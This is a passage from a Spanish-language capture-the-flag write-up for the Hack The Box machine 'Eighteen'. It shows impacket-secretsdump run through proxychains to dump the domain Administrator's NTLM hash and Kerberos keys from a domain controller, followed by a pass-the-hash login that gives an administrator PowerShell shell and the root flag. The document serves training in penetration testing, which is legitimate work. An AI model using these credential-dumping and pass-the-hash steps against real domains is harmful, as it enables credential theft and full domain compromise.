```

Usamos `impacket-secretsdump` para **obtener el hash del administrador:**

```bash
proxychains4 impacket-secretsdump -k -no-pass DC01.eighteen.htb -just-dc-user Administrator

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  DC01.eighteen.htb:49678  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  EIGHTEEN.HTB:88  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
[*] Kerberos keys grabbed
Administrator:0x14:977d41fb9cb35c5a28280a6458db3348ed1a14d09248918d182a9d3866809d7b
Administrator:0x13:5ebe190ad8b5efaaae5928226046dfc0
Administrator:aes256-cts-hmac-sha1-96:1acd569d364cbf11302bfe05a42c4fa5a7794bab212d0cda92afb586193eaeb2
Administrator:aes128-cts-hmac-sha1-96:7b6b4158f2b9356c021c2b35d000d55f
Administrator:0x17:0b133be956bfaddf9cea56701affddec
[*] Cleaning up...
```

Con el hash NTLM de Administrator `0b133be956bfaddf9cea56701affddec` nos podemos autenticar directamente desde nuestra máquina usando `evil-winrm`:

```bash
python3 evil-winrm.py -hashes :0b133be956bfaddf9cea56701affddec eighteen.htb/Administrator@10.10.11.95

'prompt_toolkit' not installed, using built-in 'readline'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] '-target_ip' not specified, using 10.10.11.95
[*] '-port' not specified, using 5985
[*] '-url' not specified, using http://10.10.11.95:5985/wsman
PS C:\Users\Administrator\Documents> 
```

Con esto hemos vulnerado la máquina, la flag está en el Desktop de Administrator:

```powershell
PS C:\Users\Administrator\Desktop> cat root.txt
```
